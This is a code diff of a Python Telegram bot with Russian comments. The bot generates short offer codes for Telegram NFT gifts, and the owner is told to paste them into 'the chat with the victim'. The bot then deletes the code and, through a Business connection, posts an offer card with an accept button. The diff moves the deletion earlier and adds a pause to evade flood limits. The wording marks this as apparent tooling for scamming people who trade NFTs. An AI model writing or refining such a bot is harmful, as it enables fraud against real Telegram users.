@@ -28,10 +28,10 @@ dp = Dispatcher()
 router = Router()
 dp.include_router(router)
 
-# Больше не нужна глобальная переменная!
-
+# Регулярки
 NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)", re.I)
 PRICE_RE = re.compile(r"(\d+)\s*(gram|грам|звезд|star|stars|⭐|grams)", re.I)
+CODE_RE = re.compile(r"(of_[a-f0-9]{5})", re.I)
 
 def parse_nft(url: str):
     m = NFT_RE.search(url)
@@ -53,7 +53,7 @@ def parse_price(text: str):
     return f"{amount} Gram" if unit in ("gram", "грам", "grams") else f"{amount} Stars"
 
 # ==========================================
-# ЛИЧКА БОТА (Подготовка оффера)
+# ЛИЧКА БОТА (Генерация оффера)
 # ==========================================
 @router.message(Command("start"))
 async def cmd_start(msg: Message):
@@ -78,7 +78,6 @@ async def cmd_buy(msg: Message):
         await msg.reply("❌ Не понял ссылку или цену. Пример:\n<code>/купить https://t.me/nft/... 155 GRAM</code>")
         return
 
-    # Генерируем короткий код
     oid = "of_" + uuid.uuid4().hex[:5]
     
     make_offer(
@@ -95,20 +94,17 @@ async def cmd_buy(msg: Message):
         f"Отправь его в чат с жертвой."
     )
 
-
 # ==========================================
-# БИЗНЕС-ЧАТ (Отправка оффера)
+# BUSINESS-ЧАТ (Отправка карточки)
 # ==========================================
 @router.business_message(F.text)
 async def handle_business_message(msg: Message):
     if msg.from_user and msg.from_user.id != ADMIN_ID: return
 
-    # Ищем код оффера в тексте
-    m = re.search(r"(of_[a-f0-9]{5})", msg.text.lower())
-    if not m:
-        return
+    m = CODE_RE.search(msg.text)
+    if not m: return
 
-    oid = m.group(1)
+    oid = m.group(1).lower()
     offer = get_offer(oid)
 
     if not offer:
@@ -117,12 +113,20 @@ async def handle_business_message(msg: Message):
 
     log.info(f"✅ Найден оффер {oid}. Отправляем...")
 
-    # Берем ID подключения ПРЯМО ИЗ СООБЩЕНИЯ
     conn_id = msg.business_connection_id
-    
     if not conn_id:
-        log.error("❌ В сообщении нет business_connection_id! Проверь, что это точно Business-чат.")
+        log.error("❌ Нет business_connection_id")
         return
+
+    # Сначала удаляем код из чата
+    try:
+        await bot.delete_message(chat_id=msg.chat.id, message_id=msg.message_id)
+        log.info("🗑 Код удален из чата")
+    except Exception as e:
+        log.warning(f"Не смог удалить код: {e}")
+
+    # Пауза 1.5 сек для обхода флуда
+    await asyncio.sleep(1.5)
 
     target_user = msg.from_user.username or "buyer"
     card_text = (
@@ -138,24 +142,16 @@ async def handle_business_message(msg: Message):
     ])
     
     try:
-        # Отправляем карточку
         await bot.send_message(
             chat_id=msg.chat.id,
             text=card_text,
-            business_connection_id=conn_id, # <--- ИСПОЛЬЗУЕМ ЕГО ЗДЕСЬ
+            business_connection_id=conn_id,
             reply_markup=kb,
             disable_web_page_preview=False
         )
-        
-        # Удаляем код из чата
-        try:
-            await bot.delete_message(chat_id=msg.chat.id, message_id=msg.message_id)
-        except Exception as e:
-            log.warning(f"Не смог удалить код: {e}")
-            
+        log.info("✅ Карточка отправлена")
     except Exception as e:
         log.error(f"❌ Ошибка отправки: {e}")
-
 
 # ==========================================
 # КНОПКИ
@@ -175,7 +171,6 @@ async def on_accept(cb: CallbackQuery):
         await cb.answer("Оффер истек", show_alert=True)
         return
     
-    # Получаем ID подключения из сообщения с кнопкой
     conn_id = cb.message.business_connection_id
     
     if conn_id:
@@ -198,18 +193,13 @@ async def on_accept(cb: CallbackQuery):
     except: pass
     await cb.answer()
 
-
 # ==========================================
-# BUSINESS CONNECTION (Логируем, но не сохраняем)
+# СЛУЖЕБНОЕ
 # ==========================================
 @router.business_connection()
 async def on_business_conn(conn: BusinessConnection):
     log.info(f"✅ Business connection: user={conn.user.id} id={conn.id}")
 
-
-# ==========================================
-# ЗАПУСК
-# ==========================================
 async def main():
     log.info("Starting bot...")
     await dp.start_polling(bot)
